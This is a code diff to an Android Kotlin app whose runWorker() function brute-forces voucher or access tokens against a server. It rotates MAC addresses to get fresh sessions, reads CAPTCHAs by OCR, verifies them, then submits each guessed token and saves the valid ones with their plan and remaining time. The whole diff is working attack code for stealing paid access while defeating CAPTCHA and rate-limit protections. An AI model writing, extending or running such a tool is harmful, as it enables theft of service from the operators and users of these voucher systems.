@@ -346,8 +346,12 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     }
 
     // ============================================================
-    // ✅ FINAL FIXED runWorker() - EXACTLY like Python Tool
-    //    No separate CAPTCHA verify. Just POST voucher directly.
+    // ✅ FINAL runWorker() - EXACTLY like Python tool
+    //    - Get session with MAC rotation
+    //    - Download CAPTCHA
+    //    - OCR
+    //    - Verify CAPTCHA (separately, like Python)
+    //    - If verified, check voucher
     // ============================================================
     private suspend fun runWorker(
         workerId: Int,
@@ -363,10 +367,11 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                     
                     addLog("[Worker-$workerId] Testing: '$token'", LogType.INFO)
 
-                    var done = false
+                    var captchaVerified = false
                     var finalCaptcha = ""
                     var finalSession = ""
 
+                    // Try up to 5 attempts for CAPTCHA (like Python)
                     for (attempt in 1..5) {
                         if (!_isProcessing.value) break
 
@@ -409,17 +414,32 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                         _currentCaptchaText.value = captcha
                         addLog("[Worker-$workerId] [$attempt/5] OCR: '$captcha'", LogType.OCR)
 
-                        // 4. POST VOUCHER DIRECTLY (with captcha as authCode)
-                        addLog("[Worker-$workerId] [$attempt/5] Checking voucher...", LogType.INFO)
+                        // 4. ✅ Verify CAPTCHA (like Python)
+                        addLog("[Worker-$workerId] [$attempt/5] Verifying CAPTCHA...", LogType.INFO)
+                        val verified = networkClient.verifyCaptcha(sessionId, captcha)
+                        
+                        if (verified) {
+                            addLog("[Worker-$workerId] [$attempt/5] ✅ CAPTCHA verified!", LogType.SUCCESS)
+                            captchaVerified = true
+                            break
+                        } else {
+                            addLog("[Worker-$workerId] [$attempt/5] ❌ CAPTCHA verification failed", LogType.ERROR)
+                            delay(1000)
+                        }
+                    }
+
+                    // 5. If CAPTCHA verified, check voucher
+                    if (captchaVerified) {
+                        addLog("[Worker-$workerId] ✅ Checking voucher...", LogType.INFO)
                         
                         val result = networkClient.validateToken(
                             postUrl = _postUrl.value,
-                            sessionId = sessionId,
-                            authCode = captcha,
+                            sessionId = finalSession,
+                            authCode = finalCaptcha,
                             accessCode = token
                         )
 
-                        // Save server response so you can see it in UI
+                        // Save server response
                         addServerResponseLog(
                             workerId = workerId,
                             token = token,
@@ -428,54 +448,43 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                             rawResponse = result.rawResponse
                         )
 
-                        // 5. Handle response (like Python)
+                        // Handle response (like Python)
                         when (result.status) {
                             TokenStatus.FOUND -> {
                                 addLog("[Worker-$workerId] 🎉 FOUND: $token", LogType.SUCCESS)
-                                val balance = networkClient.getBalanceDetails(sessionId)
+                                val balance = networkClient.getBalanceDetails(finalSession)
                                 addLog("[Worker-$workerId] Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)
                                 
                                 repository.insertToken(
                                     ValidToken(
                                         token = token,
-                                        sessionId = sessionId,
-                                        captchaText = captcha,
+                                        sessionId = finalSession,
+                                        captchaText = finalCaptcha,
                                         plan = balance.plan,
                                         time = balance.time
                                     )
                                 )
                                 _validCount.value++
-                                done = true
-                                break
                             }
                             TokenStatus.INVALID -> {
                                 addLog("[Worker-$workerId] ❌ INVALID: $token", LogType.ERROR)
                                 _invalidCount.value++
-                                done = true
-                                break
                             }
                             TokenStatus.USED -> {
                                 addLog("[Worker-$workerId] ⚠️ USED: $token", LogType.WARNING)
                                 _usedCount.value++
-                                done = true
-                                break
                             }
                             TokenStatus.LIMITED -> {
                                 addLog("[Worker-$workerId] ⚠️ LIMITED: $token", LogType.WARNING)
                                 _limitedCount.value++
-                                done = true
-                                break
                             }
                             else -> {
-                                addLog("[Worker-$workerId] [$attempt/5] Retrying...", LogType.WARNING)
+                                addLog("[Worker-$workerId] ❓ UNKNOWN: $token", LogType.WARNING)
+                                _unknownCount.value++
                             }
                         }
-
-                        delay(1000)
-                    }
-
-                    if (!done) {
-                        addLog("[Worker-$workerId] ❌ Failed for $token", LogType.ERROR)
+                    } else {
+                        addLog("[Worker-$workerId] ❌ CAPTCHA not solved after 5 attempts. Skipping token.", LogType.ERROR)
                         _errorCount.value++
                     }
 
